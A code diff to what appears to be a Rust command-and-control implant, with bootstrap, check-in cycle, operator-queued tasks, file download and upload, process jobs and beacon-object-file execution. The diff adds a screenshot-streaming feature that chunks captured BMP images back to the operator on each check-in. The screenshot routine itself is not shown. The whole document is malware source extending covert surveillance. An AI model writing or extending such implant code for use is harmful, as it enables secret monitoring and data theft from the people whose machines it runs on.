@@ -74,6 +74,9 @@ pub struct Instance {
     pub results_len: usize,
     /// Active download (one at a time; the operator queues them anyway).
     pub download: Option<crate::tasks::DownloadState>,
+    /// Active screenshot stream (one at a time; the BMP lives in a heap
+    /// buffer and drains 48 KiB per cycle).
+    pub screenshot: Option<crate::tasks::ShotState>,
     /// Live jobs (ps run): the process handle, its pid and the stdout
     /// pipe read end. The id is the original task id (the operator kills
     /// by this id).
@@ -369,6 +372,7 @@ unsafe fn bootstrap() -> Option<Instance> {
         jobs: [crate::tasks::Job::EMPTY; crate::tasks::MAX_JOBS],
         jobs_len: 0,
         download: None,
+        screenshot: None,
         upload: None,
         bof_pending: None,
         // The handle opened at the very top of the bootstrap carries over.
@@ -541,6 +545,7 @@ unsafe fn check_in_cycle(instance: &mut Instance) {
     }
     let mut chunk: [u8; 48 * 1024] = core::mem::MaybeUninit::uninit().assume_init();
     crate::tasks::download_tick(instance, &mut w, &mut chunk);
+    crate::tasks::screenshot_tick(instance, &mut w);
     crate::coff::bof_tick(instance, &mut w);
     crate::tasks::jobs_tick(instance, &mut w);
     if !transport::finish_results(&mut w) {
